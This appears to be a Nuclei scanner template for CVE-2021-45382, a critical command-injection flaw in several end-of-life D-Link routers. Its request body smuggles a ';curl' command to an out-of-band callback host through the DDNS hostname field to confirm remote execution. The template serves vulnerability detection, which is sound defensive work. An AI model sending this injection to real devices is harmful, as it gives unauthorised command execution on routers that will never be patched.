http:
- body: ccp_act=doCheck&ddnsHostName=;curl https://{{interactsh-url}};&ddnsUsername={{string1}}&ddnsPassword={{string2}}
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: curl'
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/ddns_check.ccp'
id: CVE-2021-45382
info:
  author: king-alexander
  classification:
    cpe: cpe:2.3:o:dlink:dir-820l_firmware:-:*:*:*:*:*:*:*
    cve-id: CVE-2021-45382
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.99639
    epss-score: 0.96871
  description: 'A Remote Command Execution (RCE) vulnerability exists in all series
    H/W revisions D-link DIR-810L, DIR-820L/LW, DIR-826L, DIR-830L, and DIR-836L routers
    via the DDNS function in ncc2 binary file

    '
  metadata:
    max-request: 1
    product: dir-820l_firmware
    vendor: dlink
  name: D-Link - Remote Command Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-45382
  - https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10264
  - https://github.com/doudoudedi/D-LINK_Command_Injection1/blob/main/D-LINK_Command_injection.md#poc
  remediation: 'DIR-810L, DIR-820L, DIR-830L, DIR-826L, DIR-836L, all hardware revisions,
    have reached their End of Life ("EOL") /End of Service Life ("EOS") Life-Cycle
    and as such this issue will not be patched.

    '
  severity: critical
  tags: cve,cve2021,dlink,kev,rce
variables:
  string1: '{{to_lower(rand_base(5))}}'
  string2: '{{to_lower(rand_base(6))}}'
